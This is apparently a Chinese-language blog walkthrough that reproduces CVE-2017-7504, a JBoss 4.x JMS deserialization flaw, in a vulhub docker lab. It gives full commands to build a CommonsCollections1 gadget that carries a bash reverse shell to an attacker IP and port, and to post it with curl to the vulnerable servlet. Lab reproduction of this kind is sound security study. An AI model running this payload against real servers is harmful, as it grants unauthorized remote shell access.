---
layout: post
title: JBoss 4.x JBossMQ JMS 反序列化漏洞
tags: JBoss
categories: CVE-2017-7504
---

# JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）

## 漏洞描述

Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
环境启动后访问`http://your-ip:8080`可以看到JBoss默认页面

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-7504/15937634046954.jpg)

参考利用工具[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)，我们选择一个Gadget：ExampleCommonsCollections1WithHashMap，编译并生成序列化数据：

```
git clone https://github.com/joaomatosf/JavaDeserH2HC

cd JavaDeserH2HC/

//编译

javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java 

//生成ExampleCommonsCollections1WithHashMap.ser反序列化文件

java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "/bin/bash -i >& /dev/tcp/攻击机IP/监听端口 0>&1"

//向目标发送反序列化ser文件

curl http://127.0.0.1:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-7504/15937652236071.jpg)

同时攻击机开启监听，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/CVE-2017-7504/15937651079937.jpg)
